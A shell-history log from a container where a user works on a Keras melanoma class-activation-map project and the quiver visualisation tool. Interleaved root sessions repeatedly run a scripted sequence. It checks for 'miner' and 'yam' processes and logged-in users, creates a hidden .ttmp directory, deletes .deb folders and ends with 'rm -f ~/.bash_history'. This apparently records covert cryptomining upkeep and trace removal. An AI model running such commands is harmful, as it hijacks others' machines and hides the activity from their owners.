+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 12:56 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 12:56 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 12:56 /notebooks
+vi cam.py  ### @f5e57551b879 not a tty 20161222 13:48 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 13:48 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 14:02 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161222 14:02 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161222 14:02 /datamnt/github/keras-cam-melanoma
+git add . ### @f5e57551b879 not a tty 20161222 14:03 /datamnt/github/keras-cam-melanoma
+git commit -a -m "quiver visualization" ### @f5e57551b879 not a tty 20161222 14:03 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161222 14:04 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161222 14:04 /datamnt/github/keras-cam-melanoma
+git commit -a -m "quiver log" ### @f5e57551b879 not a tty 20161222 14:04 /datamnt/github/keras-cam-melanoma
+git push ### @f5e57551b879 not a tty 20161222 14:04 /datamnt/github/keras-cam-melanoma
+git push ### @f5e57551b879 not a tty 20161222 14:05 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161222 14:05 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 14:06 /datamnt/github/keras-cam-melanoma
+ln /dev/null /dev/raw1394 ### @f5e57551b879 not a tty 20161222 14:08 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 14:08 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161222 14:09 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 14:09 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### @f5e57551b879 not a tty 20161222 14:14 /notebooks
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --train True --dataset_path /datamnt/trainsmall/  ### @f5e57551b879 not a tty 20161222 14:14 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --train True --dataset_path /datamnt/trainsmall/  ### @f5e57551b879 not a tty 20161222 14:14 /datamnt/github/keras-cam-melanoma
+ps  ### @f5e57551b879 not a tty 20161222 14:14 /notebooks
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 14:14 /datamnt/github/keras-cam-melanoma
+ps -a ### @f5e57551b879 not a tty 20161222 14:14 /notebooks
+ps -ax ### @f5e57551b879 not a tty 20161222 14:14 /notebooks
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 14:23 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 14:23 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 14:23 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 14:23 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 14:23 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161222 14:24 /datamnt/github/quiver
+vi dist/ ### @f5e57551b879 not a tty 20161222 14:24 /datamnt/github/quiver
+vi build/lib.linux-x86_64-2.7/quiver_engine/quiverboard/dist/index.html  ### @f5e57551b879 not a tty 20161222 14:25 /datamnt/github/quiver
+vi build/lib.linux-x86_64-2.7/quiver_engine/imagenet_utils.py  ### @f5e57551b879 not a tty 20161222 14:25 /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161222 14:25 /datamnt/github/quiver
+ls build/ ### @f5e57551b879 not a tty 20161222 14:25 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/config.js  ### @f5e57551b879 not a tty 20161222 14:26 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/config.js ### @f5e57551b879 not a tty 20161222 14:26 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/main.js  ### @f5e57551b879 not a tty 20161222 14:26 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/routes/ ### @f5e57551b879 not a tty 20161222 14:27 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/routes/ ### @f5e57551b879 not a tty 20161222 14:28 /datamnt/github/quiver
+grep -R QUIVER  ### @f5e57551b879 not a tty 20161222 14:28 /datamnt/github/quiver
+vi quiver_engine/quiverboard/src/routes/home/resource/index.js ### @f5e57551b879 not a tty 20161222 14:29 /datamnt/github/quiver
+grep -R fetchInputs ### @f5e57551b879 not a tty 20161222 14:29 /datamnt/github/quiver
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 14:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 14:30 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 14:30 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 14:30 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 14:30 /notebooks
+vi quiver_engine/quiverboard/src/routes/home/state/inputs.js ### @f5e57551b879 not a tty 20161222 14:34 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161222 14:34 /datamnt/github/quiver
+git diff setup.py  ### @f5e57551b879 not a tty 20161222 14:34 /datamnt/github/quiver
+git diff quiver_engine/server.py ### @f5e57551b879 not a tty 20161222 14:35 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161222 14:35 /datamnt/github/quiver
+git diff quiver_engine/quiverboard/package.json ### @f5e57551b879 not a tty 20161222 14:35 /datamnt/github/quiver
+git revert quiver_engine/quiverboard/package.json ### @f5e57551b879 not a tty 20161222 14:35 /datamnt/github/quiver
+vi quiver_engine/quiverboard/package.json ### @f5e57551b879 not a tty 20161222 14:36 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161222 14:36 /datamnt/github/quiver
+cd quiver_engine/quiverboard/ ### @f5e57551b879 not a tty 20161222 14:36 /datamnt/github/quiver -> /datamnt/github/quiver/quiver_engine/quiverboard
+npm install ### @f5e57551b879 not a tty 20161222 14:38 /datamnt/github/quiver/quiver_engine/quiverboard
+npm start ### @f5e57551b879 not a tty 20161222 14:39 /datamnt/github/quiver/quiver_engine/quiverboard
+vi /datamnt/github/quiver/quiver_engine/quiverboard/npm-debug.log ### @f5e57551b879 not a tty 20161222 14:39 /datamnt/github/quiver/quiver_engine/quiverboard
+vi /datamnt/github/quiver/quiver_engine/quiverboard/npm-debug.log ### @f5e57551b879 not a tty 20161222 14:40 /datamnt/github/quiver/quiver_engine/quiverboard
+npm install ### @f5e57551b879 not a tty 20161222 14:40 /datamnt/github/quiver/quiver_engine/quiverboard
+ls ### @f5e57551b879 not a tty 20161222 14:42 /datamnt/github/quiver/quiver_engine/quiverboard
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 15:48 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 15:48 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 15:48 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 15:49 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 18:54 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 20:20 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 21:50 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 21:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 21:50 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 21:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 21:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 23:20 /notebooks
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --train True --dataset_path /datamnt/trainsmall/  ### @f5e57551b879 not a tty 20161222 23:26 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 01:02 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 01:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 01:02 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 01:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 01:03 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 02:53 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 04:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 06:35 /notebooks
+ls ### @f5e57551b879 not a tty 20161223 07:25 /datamnt/github/keras-cam-melanoma
+mkdir archiveweights-23dec ### @f5e57551b879 not a tty 20161223 07:25 /datamnt/github/keras-cam-melanoma
+mv weights.* archiveweights-23dec/ ### @f5e57551b879 not a tty 20161223 07:25 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 07:26 /datamnt/github/keras-cam-melanoma
+cd ../../../keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161223 07:26 /datamnt/github/quiver/quiver_engine/quiverboard -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 07:26 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 07:26 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 07:26 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:01 /datamnt/github/keras-cam-melanoma
+ls -l ### @f5e57551b879 not a tty 20161223 08:01 /datamnt/github/keras-cam-melanoma
+cd .. ### @f5e57551b879 not a tty 20161223 08:01 /datamnt/github/keras-cam-melanoma -> /datamnt/github
+ls ### @f5e57551b879 not a tty 20161223 08:01 /datamnt/github
+sudo chmod -R a+w keras-cam-melanoma ### @f5e57551b879 not a tty 20161223 08:02 /datamnt/github
+cd - ### @f5e57551b879 not a tty 20161223 08:02 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 08:26 /notebooks
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:27 /datamnt/github/keras-cam-melanoma
+cd ../quiver/quiver_engine/ ### @f5e57551b879 not a tty 20161223 08:27 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver/quiver_engine
+vi server.py  ### @f5e57551b879 not a tty 20161223 08:27 /datamnt/github/quiver/quiver_engine
+cd - ### @f5e57551b879 not a tty 20161223 08:27 /datamnt/github/quiver/quiver_engine -> /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 08:28 /datamnt/github/quiver/quiver_engine -> /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161223 08:28 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:30 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 08:30 /datamnt/github/keras-cam-melanoma
+ls -l ### @f5e57551b879 not a tty 20161223 08:30 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 08:30 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver/quiver_engine
+vi server.py  ### @f5e57551b879 not a tty 20161223 08:31 /datamnt/github/quiver/quiver_engine
+cd - ### @f5e57551b879 not a tty 20161223 08:31 /datamnt/github/quiver/quiver_engine -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 08:31 /datamnt/github/keras-cam-melanoma
+ls imgs/pos/ ### @f5e57551b879 not a tty 20161223 08:32 /datamnt/github/keras-cam-melanoma
+ls imgs/pos/ ### @f5e57551b879 not a tty 20161223 08:32 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:34 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:34 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 08:35 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver/quiver_engine
+git diff setup.py  ### @f5e57551b879 not a tty 20161223 08:35 /datamnt/github/quiver/quiver_engine
+python setup.py install ### @f5e57551b879 not a tty 20161223 08:35 /datamnt/github/quiver/quiver_engine
+cd .. ### @f5e57551b879 not a tty 20161223 08:36 /datamnt/github/quiver/quiver_engine -> /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161223 08:36 /datamnt/github/quiver
+cd ../keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161223 08:36 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:36 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python setup.py install ### @f5e57551b879 not a tty 20161223 08:37 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 08:41 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 08:45 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 08:45 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
